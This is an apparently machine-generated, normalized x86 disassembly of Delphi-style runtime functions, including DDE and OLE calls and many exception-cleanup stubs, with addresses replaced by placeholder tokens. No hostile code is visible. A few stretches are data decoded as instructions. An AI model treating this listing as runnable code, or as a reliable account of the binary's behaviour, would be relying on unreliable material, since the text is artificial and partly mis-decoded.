jmp sub_403a3c
sub_46a16e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a174
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_4175ec
pop ebx
retn
sub_46a188
mov eax [ eax + 0x40 ]
call sub_4176b4
retn
sub_46a2d2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_46a2e0
jmp sub_403a3c
j_sub_46a2d2
jmp sub_46a2d2
sub_46a2e7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46a397
jmp sub_403a3c
sub_46a39e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46a467
jmp sub_403a3c
sub_46a46e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a802
jmp sub_403a3c
sub_46a809
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a9b8
mov [ eax + 0xc6 ] 0x0
retn
sub_46aa9c
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_46aa04
sub_46aabc
retn
sub_46aac0
retn
sub_46aac4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
sub_46aad8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
sub_46aaec
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_46ab0c
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46ac8f
jmp sub_403a3c
sub_46ac96
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ada8
retn
sub_46adac
retn
sub_46aebd
jmp sub_403a3c
sub_46aec4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46af99
jmp sub_403a3c
sub_46afa0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46b010
push ecx
push edx
call DdeAccessData
retn
sub_46b018
push edx
call DdeUnaccessData
retn
sub_46b138
mov eax [ eax + 0x10 ]
call sub_46ad34
retn
sub_46b1c0
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41d168
sub_46b29c
jmp sub_403a3c
sub_46b2a3
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46b333
jmp sub_403a3c
sub_46b33a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b3c3
jmp sub_403a3c
sub_46b3ca
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b3d4
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46b513
jmp sub_403a3c
sub_46b51a
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b524
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_46b538
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46b734
jmp sub_403a3c
sub_46b73b
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_403a3c#9
jmp sub_403a3c
sub_46b822
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46b94d
jmp sub_403a3c
sub_46b954
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46bc05
jmp sub_403a3c
sub_46bc0c
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bc18
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
sub_46bcc1
jmp sub_403a3c
sub_46bcc8
pop ebp
retn
sub_46bd55
jmp sub_403a3c
sub_46bd5c
pop ebp
retn
sub_46bd60
sub [ rw-data ] 0x1
retn
j_sub_46ce28
jmp sub_46ce28
sub_46be9a
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46cf10
sub_46bea7
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46cf2c
sub_46beb4
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46cf38
sub_46bec1
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46cf78
sub_46bece
add [ esp + 0x4 ] 0xfffffd78
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_46cb2e
push ecx
0x46
sub_46cb32
pop ebx
0x46
sub_46cb36
0x46
sub_46cb3a
outsd
0x46
sub_46cb3e
sbb eax 0x250046ca
0x46
sub_46cb46
sub eax 0x350046ca
0x46
sub_46cb50
inc esi
add ch ch
0x46
sub_46cb56
test edx 0xcad30046
inc esi
add bl bl
0x46
j_sub_403a3c#8
jmp sub_403a3c
sub_46cf02
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
sub_46cf10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push edx
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
xor eax eax
pop ebp
retn 0x1c
sub_46cf2c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_46cfb0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
call sub_405928
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_46cfd0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
call sub_405928
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_46cff0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_46d064
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_46d22c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_46d2e5
jmp sub_403788
sub_46d2ea
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_45f9a8
call sub_403af0
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_46d308
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov si 0xffb3
call sub_4034e4
pop esi
pop ebp
retn 0xc
sub_46d320
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x220 ]
jne r-xdata
pop ebp
retn 0xc
call sub_46ec10
sub_46d33c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_46d344
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_46d34c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_46d433
jmp sub_403a3c
sub_46d43a
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46d5b0
cmp [ eax + 0x21c ] 0x0
jne r-xdata
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
sub_46d628
push ebx
mov ebx edx
mov edx ebx
call sub_443324
or [ ebx + 0x4 ] 0x2000000
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_46d640
cmp [ eax + 0x252 ] 0x2
jne r-xdata
call sub_441258
retn
mov edx 0xffff0000
call sub_46d878
retn
sub_46d6a0
call sub_456c04
test eax eax
je r-xdata
retn
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46d810
jmp sub_403a3c
sub_46d817
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d82c
push ebx
mov ebx eax
mov eax [ ebx + 0x24c ]
call sub_4032e8
xor eax eax
mov [ ebx + 0x24c ] eax
mov eax [ ebx + 0x22c ]
call sub_4032e8
xor eax eax
mov [ ebx + 0x22c ] eax
pop ebx
retn
sub_46d858
push ebx
mov ebx eax
cmp [ ebx + 0x252 ] 0x1
jne r-xdata
mov eax ebx
call sub_444db4
pop ebx
retn
or edx 0xffffffff
mov eax ebx
call sub_46d878
sub_46d970
cmp [ eax + 0x220 ] 0x4
sete al
retn
j_sub_403a3c#7
jmp sub_403a3c
sub_46da4c
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403a3c#6
jmp sub_403a3c
sub_46dbbd
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ddb6
jmp sub_403a3c
sub_46ddbd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403a3c#5
jmp sub_403a3c
sub_46df80
jmp sub_403788
sub_46dff8
test [ eax + 0x1c ] 0x2
jne r-xdata
retn
mov [ eax + 0x25a ] 0x1
mov [ eax + 0x25b ] 0x1
call sub_46d6a0
sub_46e3b0
jmp sub_403a3c
sub_46e3b7
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46e534
jmp sub_403a3c
sub_46e53b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e560
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_46e559
jmp sub_403a3c
sub_46e560
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e568
push ebx
mov ebx eax
cmp dl [ ebx + 0x254 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x254 ] dl
mov eax ebx
call sub_46d55c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46e776
jmp sub_403a3c
j_sub_403a3c#4
jmp sub_403a3c
sub_46e7cc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e878
push ebx
mov ebx eax
cmp dl [ ebx + 0x257 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x257 ] dl
mov eax ebx
call sub_46d55c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
j_sub_403788
jmp sub_403788
sub_46ea32
jmp sub_403a3c
sub_46ea39
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ec01
jmp sub_403a3c
sub_46ec08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ec93
jmp sub_403a3c
sub_46ec9a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ed6c
push ebx
mov ebx eax
mov eax ebx
call sub_444be0
xor edx edx
mov eax ebx
call sub_46e7e4
pop ebx
retn
sub_46eeec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4464d0
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_46ef08
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_46f294
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0xc ]
add eax 0x80
mov edx [ ebp + 0xc ]
call sub_404260
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_46f2b4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_46f40c
xor ecx ecx
inc ecx
cmp ecx 0x4
jne r-xdata
mov al 0x1
retn
cmp edx [ eax + ecx * 4 + 0x24 ]
jne r-xdata
xor eax eax
retn
sub_46f450
mov eax [ eax + 0x10 ]
call sub_417414
retn
sub_46f45c
mov eax [ eax + 0x10 ]
call sub_4176b4
retn
sub_46f468
mov eax [ eax + 0xc ]
retn
j_sub_403a3c#3
jmp sub_403a3c
sub_46f56f
pop ebp
retn
sub_46f574
sub [ rw-data ] 0x1
jae r-xdata
retn
push 0x0
call OleInitialize
call sub_46f46c
j_sub_403a3c#2
jmp sub_403a3c
sub_46f8cc
pop ebp
retn
sub_46fb19
jmp sub_403a3c
sub_46fb20
pop esi
pop ebx
pop ebp
retn
sub_46fb92
retn
j_sub_403a3c
jmp sub_403a3c
j_sub_46fb92
jmp sub_46fb92
sub_46fb9a
pop ebp
retn
